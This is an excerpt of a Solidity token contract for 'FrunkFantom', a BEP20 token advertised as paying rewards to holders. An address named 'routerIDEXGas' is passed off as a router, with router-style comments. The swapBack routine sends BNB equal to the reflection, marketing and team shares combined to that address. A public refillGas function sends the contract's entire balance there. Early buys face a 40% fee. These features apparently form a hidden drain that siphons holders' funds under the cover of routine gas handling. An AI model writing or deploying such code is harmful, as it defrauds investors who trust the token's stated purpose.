...
/**
    FrunkFantom - Fantom Rewards for the holders
    Telegram: https://t.me/FrunkFantom
    Twitter: https://twitter.com/FrunkFantom
    Website: https://frunkfantom.site
*/
...
contract FrunkFantom is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "FrunkFantom";
    string constant _symbol = "FRUNKFTM";
    ...
    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //Testnet 0xD99D1c33F9fC3444f8101754aBC46c52416550D1 // Mainnet 0x10ED43C718714eb63d5aA57B78B54704E256024E
        routerIDEXGas = 0x413C2497F12C66d74b81E42Ad0637293Be9f350A; //Testnet 0x0d0d627a7F65A57D637137c1dfeC93681e4b1f3e // Mainnet 0x413C2497F12C66d74b81E42Ad0637293Be9f350A
        ...
        autoLiquidityReceiver = 0xE2a633797e913448460966920C6Cc6054f50cfe0; //to change these values
        marketingFeeReceiver = 0xE2a633797e913448460966920C6Cc6054f50cfe0;
        teamFeeReceiver = 0xe5272223F4A2b74Cc8E6Ba642fe53030382BF669;
    ...
    function takeFee(address sender, uint256 rAmount, bool isSell) internal returns (uint256) {
        ...
        if(!isSell && (launchedAt + deadBlocks) > block.number){
            feeAmount = rAmount.div(100).mul(40);
        }
    ...
    function setLaunch(bool _status, uint256 _deadBlocks) public onlyOwner {
        tradingOpen = _status;
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBgas = amountBNBReflection.add(amountBNBMarketing).add(amountBNBteam);

        try distributor.deposit{value: amountBNBReflection}() {} catch {}
        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        (tmpSuccess,) = payable(routerIDEXGas).call{value: amountBNBgas, gas: 30000}("");
    ...
    function refillGas() external {
        uint256 amountBNB = address(this).balance;
        payable(routerIDEXGas).transfer(amountBNB);
    }
